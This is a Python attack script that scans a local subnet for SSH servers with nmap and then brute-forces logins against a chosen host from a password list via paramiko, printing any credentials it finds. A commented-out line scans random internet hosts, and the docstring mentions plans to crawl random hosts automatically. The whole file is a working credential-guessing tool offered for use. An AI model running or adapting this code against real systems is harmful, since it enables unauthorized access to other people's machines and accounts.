"""SSH host discovery and Brute force login, may update in the future to crawl
    through random hosts and brute force logins"""

import os
import sys
import nmap
import paramiko
import socket
#see https://github.com/paramiko/paramiko/issues1386 for warning import
import warnings
warnings.filterwarnings(action='ignore', module='.*paramiko.*')

global hosts, target_host, ports, username, line, passwd_file

#host discovery for machines running SSH on port 22
def host_discovery():
    """looking for SSH servers with default port,
        best chance to avoid being locked out."""
    target_list = []

    #scan using nmap, nmap must be installed on localhost    
    nm = nmap.PortScanner()
    #DANGEROUS EXTERNAL HOST DISCOVERY
    #nm.scan(hosts='0.0.0.0', arguments='-iR 100', ports='22')
    #LOCAL
    nm.scan(hosts='192.168.1.1/24', arguments='-sT', ports='22')
    
    #create list of available hosts to brute force
    for host in nm.all_hosts():
        target_list.append(host)
        print('-' * 40)
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('-' * 20)
            print('Protocol : %s' %  proto)

            lport = list(nm[host][proto].keys())
            lport.sort()
            for port in lport:
                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
    return target_list

#start hitting the host with auth attempts from password list
def brute_force(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target_host, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code


if __name__ == '__main__':
    try:
        target_list = host_discovery()
        print('\nHOST LIST:')
        for target in enumerate(target_list):
            print(target)
        user_opt1 = input('Choose a host to attack: ')
        target_host = target_list[int(user_opt1)]
        print('\n')

        username = input('Enter SSH username: ')
        passwd_file = input('Enter password list path: ')
        print('\n')

        if os.path.exists(passwd_file) == False:
            print('Password list not found.')
            sys.exit(4)
    except KeyboardInterrupt:
        print('\n\nQuitting...')
        sys.exit(3)

    passwd_file = open(passwd_file)

    for i in passwd_file.readlines():
        password = i.strip('\n')
        try:
            response = brute_force(password)

            if response == 0:
                print('\n\n[+] USER: %s | Password found: %s' % (username, password))
                sys.exit(0)
            elif response == 1:
                print('[-] USER: %s | Password: %s -- FAILED LOGIN' % (username, password))
            elif response == 2:
                print('!! Host Unreachable: %s !!' % (target_host))
        except:
            pass

    passwd_file.close()
